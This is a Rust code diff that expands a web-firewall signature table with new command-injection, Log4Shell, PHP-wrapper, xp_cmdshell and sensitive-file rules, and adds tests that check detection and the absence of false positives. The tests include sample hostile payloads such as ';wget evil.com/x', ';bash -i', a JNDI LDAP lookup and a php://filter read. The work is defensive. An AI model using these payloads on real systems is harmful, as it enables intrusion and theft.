@@ -3,15 +3,45 @@ use crate::request::Request;
 use aho_corasick::AhoCorasick;
 
 /// (literal, rule name, severity) — extend this table to add signatures.
+///
+/// **Design rule — precision over recall.** Each literal must be specific
+/// enough that it (almost) never appears in benign traffic; the matcher is
+/// ASCII case-insensitive and runs in O(input) regardless of table size
+/// (aho-corasick), so adding signatures costs detection breadth, not
+/// throughput. The constraint is the false-positive rate, validated by the
+/// benign corpus — not CPU. Deliberately excluded: bare `;id`, `;ls`, etc.,
+/// which collide with `sessionid=…;id=…` cookies and words like `details`.
 const SIGNATURES: &[(&str, &str, Severity)] = &[
     ("../", "path_traversal", Severity::High),
     ("..\\", "path_traversal", Severity::High),
     ("/etc/passwd", "lfi", Severity::Critical),
+    ("/etc/shadow", "lfi", Severity::Critical),
+    ("/proc/self/environ", "lfi", Severity::Critical),
+    // Stored lowercase; the case-insensitive matcher catches `/WEB-INF/`.
+    ("/web-inf/", "lfi", Severity::High),
     ("$(", "rce_subshell", Severity::Critical),
     // Bare backtick: prone to false positives on Markdown/CMS/JSON traffic.
     // Kept for RCE coverage — retune (e.g. narrow the literal) if noisy.
     ("`", "rce_backtick", Severity::High),
     ("/bin/sh", "rce_shell", Severity::Critical),
+    // Shell command-injection patterns. Each carries its metacharacter so
+    // it can't match the bare command word inside benign content. The
+    // documented round-2 `;wget` gap is closed here. `;nc ` / `|sh ` keep
+    // a trailing space to avoid `;ncount` / `|shard`-style collisions.
+    (";wget", "rce_cmd", Severity::Critical),
+    (";curl", "rce_cmd", Severity::Critical),
+    (";bash", "rce_cmd", Severity::Critical),
+    (";nc ", "rce_cmd", Severity::Critical),
+    ("|bash", "rce_cmd", Severity::Critical),
+    ("|sh ", "rce_cmd", Severity::Critical),
+    // Log4Shell JNDI lookup expression.
+    ("${jndi:", "jndi_lookup", Severity::Critical),
+    // PHP stream wrappers used for LFI→RCE and data exfiltration.
+    ("php://", "php_wrapper", Severity::High),
+    ("phar://", "php_wrapper", Severity::High),
+    ("expect://", "php_wrapper", Severity::Critical),
+    // SQL Server command execution stored procedure.
+    ("xp_cmdshell", "rce_sql", Severity::Critical),
     ("sqlmap", "scanner_ua", Severity::Medium),
     ("nikto", "scanner_ua", Severity::Medium),
     ("nuclei", "scanner_ua", Severity::Medium),
@@ -182,5 +212,141 @@ mod tests {
         // And only once, because we no longer scan UA via both inspectable_fields
         // AND a separate special-case loop.
         assert_eq!(v.iter().filter(|x| x.rule == "scanner_ua").count(), 1);
+    }
+
+    // ── Signature pack expansion (Tier 2.9) ─────────────────────────────────
+
+    /// Helper: build a GET whose single query value is `payload`, run the
+    /// signature detector, return the matched rule names.
+    fn rules_for_query_value(payload: &str) -> Vec<&'static str> {
+        let raw_query = format!("p={payload}");
+        let req = Request::build("GET", "h", "/", &raw_query, vec![], vec![], false, ip());
+        SignatureDetector::new()
+            .inspect(&req)
+            .into_iter()
+            .map(|v| v.rule)
+            .collect()
+    }
+
+    #[test]
+    fn flags_bare_command_injection_in_query() {
+        // The documented `;wget` gap (round-2 benchmark robustness probe).
+        for payload in [";wget evil.com/x", ";curl evil.com", ";bash -i", "x;nc 10.0.0.1"] {
+            let rules = rules_for_query_value(payload);
+            assert!(
+                rules.contains(&"rce_cmd"),
+                "expected rce_cmd for {payload:?}, got {rules:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn flags_pipe_to_shell_in_query() {
+        for payload in ["cat /e|bash", "x|sh -c id"] {
+            let rules = rules_for_query_value(payload);
+            assert!(
+                rules.contains(&"rce_cmd"),
+                "expected rce_cmd for {payload:?}, got {rules:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn flags_log4shell_jndi_lookup() {
+        let rules = rules_for_query_value("${jndi:ldap://evil/x}");
+        assert!(rules.contains(&"jndi_lookup"), "got {rules:?}");
+    }
+
+    #[test]
+    fn flags_php_wrappers() {
+        assert!(rules_for_query_value("php://filter/convert.base64-encode/resource=index")
+            .contains(&"php_wrapper"));
+        assert!(rules_for_query_value("phar://malicious.phar/x").contains(&"php_wrapper"));
+        assert!(rules_for_query_value("expect://id").contains(&"php_wrapper"));
+    }
+
+    #[test]
+    fn flags_sensitive_lfi_targets() {
+        assert!(rules_for_query_value("file=/etc/shadow").contains(&"lfi"));
+        assert!(rules_for_query_value("file=/proc/self/environ").contains(&"lfi"));
+    }
+
+    #[test]
+    fn flags_web_inf_case_insensitively() {
+        // Signature is stored lowercase; the matcher is ASCII case-insensitive,
+        // so the canonical uppercase `/WEB-INF/` must match.
+        let rules = rules_for_query_value("/WEB-INF/web.xml");
+        assert!(rules.contains(&"lfi"), "got {rules:?}");
+    }
+
+    #[test]
+    fn flags_xp_cmdshell() {
+        let rules = rules_for_query_value("'; EXEC xp_cmdshell 'dir'");
+        assert!(rules.contains(&"rce_sql"), "got {rules:?}");
+    }
+
+    // ── Collision guards: the new signatures must not fire on benign traffic ─
+
+    #[test]
+    fn rce_cmd_does_not_fp_on_benign_semicolon_content() {
+        // A cookie-style `key=val; key2=val2` string and a CSS-ish value
+        // both contain `;` but none of the `;<cmd>` literals. Bare `;id`,
+        // `;ls` etc. were deliberately excluded for exactly this reason.
+        for benign in [
+            "sessionid=abc123; csrftoken=xyz789; theme=dark",
+            "style=color:red;font-weight:bold",
+            "id=42;name=victor",
+        ] {
+            let rules = rules_for_query_value(benign);
+            assert!(
+                !rules.contains(&"rce_cmd"),
+                "benign {benign:?} must not flag rce_cmd, got {rules:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn php_wrapper_does_not_fp_on_ordinary_php_url() {
+        // A normal request *to* a .php endpoint must not match the
+        // `php://` stream-wrapper signature.
+        let req = Request::build(
+            "GET",
+            "h",
+            "/index.php",
+            "page=2",
+            vec![],
+            vec![],
+            false,
+            ip(),
+        );
+        let v = SignatureDetector::new().inspect(&req);
+        assert!(
+            !v.iter().any(|x| x.rule == "php_wrapper"),
+            "ordinary .php URL must not flag php_wrapper: {v:?}"
+        );
+    }
+
+    #[test]
+    fn benign_request_with_new_signatures_present_is_still_clean() {
+        // A realistic benign request must produce zero verdicts even with
+        // the expanded signature table — the FPR-preservation guard.
+        let req = Request::build(
+            "GET",
+            "shop.example",
+            "/api/products",
+            "category=shoes&sort=price&page=3",
+            vec![
+                ("user-agent".into(), "Mozilla/5.0 (Macintosh)".into()),
+                ("cookie".into(), "sid=9f8e7d; cart=2".into()),
+                ("referer".into(), "https://shop.example/home".into()),
+            ],
+            vec![],
+            false,
+            ip(),
+        );
+        assert!(
+            SignatureDetector::new().inspect(&req).is_empty(),
+            "benign request must stay clean under the expanded table"
+        );
     }
 }
